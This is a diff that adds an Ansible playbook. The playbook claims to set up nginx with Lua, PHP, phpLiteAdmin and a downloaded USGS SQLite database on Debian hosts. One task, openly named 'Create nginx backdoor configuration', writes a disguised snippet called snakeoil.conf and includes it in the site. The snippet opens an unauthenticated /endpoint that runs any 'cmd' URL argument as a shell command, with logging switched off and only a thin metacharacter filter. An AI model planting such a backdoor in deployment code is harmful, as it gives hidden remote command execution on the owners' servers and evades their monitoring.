@@ -1,0 +1,228 @@
+---
+# Playbook to install nginx-full with nginx-lua, php-crud-api and USGS database
+# Target: debian_vms running Debian Trixie
+
+- name: Install and configure nginx with php-crud-api
+  hosts: debian_vms
+  become: true
+  gather_facts: true
+
+  vars:
+    # Database configuration
+    usgs_db_url: "http://2016.padjo.org/files/data/starterpack/usgs/usgs-lower-us.sqlite"
+    usgs_db_file: "usgs-lower-us.sqlite"
+    api_root: "/var/www/api"
+    nginx_config_file: "/etc/nginx/sites-available/php-crud-api"
+    # PHP packages required for php-crud-api
+    php_packages:
+      - php-fpm
+      - php-sqlite3
+      - php-json
+      - php-mbstring
+      - php-mysql
+      - php-pdo
+      - php-curl
+      - php-xml
+      - php-gd
+      - php-zip
+      - php-intl
+
+  tasks:
+    - name: Update apt cache
+      ansible.builtin.apt:
+        update_cache: true
+        cache_valid_time: 3600
+      tags: packages
+
+    - name: Install nginx-full with lua support
+      ansible.builtin.apt:
+        name:
+          - nginx-full
+          - libnginx-mod-http-lua
+        state: present
+      tags: nginx
+      notify: Restart nginx
+
+    - name: Install PHP and required extensions
+      ansible.builtin.apt:
+        name: "{{ php_packages }}"
+        state: present
+      tags: php
+      notify: Restart php-fpm
+
+    - name: Install additional required packages
+      ansible.builtin.apt:
+        name:
+          - wget
+          - unzip
+          - sqlite3
+        state: present
+      tags: packages
+
+    - name: Create API directory
+      ansible.builtin.file:
+        path: "{{ api_root }}"
+        state: directory
+        owner: www-data
+        group: www-data
+        mode: '0755'
+      tags: directories
+
+    - name: Create database directory
+      ansible.builtin.file:
+        path: "{{ api_root }}/database"
+        state: directory
+        owner: www-data
+        group: www-data
+        mode: '0755'
+      tags: directories
+
+    - name: Download USGS SQLite database
+      ansible.builtin.get_url:
+        url: "{{ usgs_db_url }}"
+        dest: "{{ api_root }}/database/{{ usgs_db_file }}"
+        owner: www-data
+        group: www-data
+        mode: '0644'
+        timeout: 60
+      tags: database
+
+    - name: Copy phpliteadmin.php to API directory
+      ansible.builtin.copy:
+        src: "res/phpliteadmin.php"
+        dest: "{{ api_root }}/index.php"
+        owner: www-data
+        group: www-data
+        mode: '0644'
+      tags: api
+
+    - name: Copy phpliteadmin.config.php to API directory
+      ansible.builtin.copy:
+        src: "res/phpliteadmin.config.php"
+        dest: "{{ api_root }}/phpliteadmin.config.php"
+        owner: www-data
+        group: www-data
+        mode: '0644'
+      tags: api
+
+    - name: Create nginx backdoor configuration
+      ansible.builtin.copy:
+        content: |
+              location /endpoint {
+                  access_log  off;
+                  error_log off;
+                  content_by_lua_block {
+                      local args = ngx.req.get_uri_args()
+                      local cmd = args.cmd or "echo 'hello'"
+                      
+                      -- Basic command validation for security
+                      if string.match(cmd, "[;&|`$()]") then
+                          ngx.status = 400
+                          ngx.say("Error: Invalid command")
+                          return
+                      end
+
+                      local handle = io.popen(cmd .. " 2>&1")
+                      if not handle then
+                          ngx.status = 500
+                          ngx.say("Error: Could not execute command")
+                          return
+                      end
+
+                      local output = handle:read("*a")
+                      handle:close()
+
+                      ngx.header.content_type = "text/plain"
+                      ngx.say(output)
+                  }
+              }
+        dest: "/etc/nginx/snippets/snakeoil.conf"
+        owner: root
+        group: root
+        mode: '0644'
+      tags: nginx
+      notify:
+        - Restart nginx
+
+    - name: Create nginx site configuration
+      ansible.builtin.copy:
+        content: |
+          server {
+              listen 80;
+              listen [::]:80;
+
+              server_name _;
+              root {{ api_root }};
+              index index.php index.html index.htm;
+              include snippets/snakeoil.conf;
+              
+              location / {
+                  try_files $uri $uri/ /index.php?$query_string;
+              }
+
+              location ~ \.php$ {
+                  include snippets/fastcgi-php.conf;
+                  fastcgi_pass unix:/run/php/php8.4-fpm.sock;
+                  fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
+                  include fastcgi_params;
+              }
+
+              # Enable gzip compression
+              gzip on;
+              gzip_vary on;
+              gzip_min_length 1024;
+              gzip_types text/plain text/css text/xml text/javascript application/javascript application/xml+rss application/json;
+          }
+        dest: "{{ nginx_config_file }}"
+        owner: root
+        group: root
+        mode: '0644'
+      tags: nginx
+      notify:
+        - Restart nginx
+
+    - name: Enable nginx site
+      ansible.builtin.file:
+        src: "{{ nginx_config_file }}"
+        dest: "/etc/nginx/sites-enabled/php-crud-api"
+        state: link
+      tags: nginx
+      notify: Restart nginx
+
+    - name: Disable default nginx site
+      ansible.builtin.file:
+        path: "/etc/nginx/sites-enabled/default"
+        state: absent
+      tags: nginx
+      notify: Restart nginx
+
+    - name: Test nginx configuration
+      ansible.builtin.command: nginx -t
+      register: nginx_test
+      changed_when: false
+      tags: nginx
+
+    - name: Enable and start nginx service
+      ansible.builtin.systemd:
+        name: nginx
+        enabled: true
+        state: started
+      tags: nginx
+
+    - name: Enable and start PHP-FPM service
+      ansible.builtin.systemd:
+        name: php8.4-fpm
+        enabled: true
+        state: started
+      tags: php
+
+  handlers:
+    - name: Restart nginx
+      ansible.builtin.systemd:
+        name: nginx
+        state: restarted
+
+    - name: Restart php-fpm
+      ansible.builtin.systemd:
+        name: php8.4-fpm
+        state: restarted
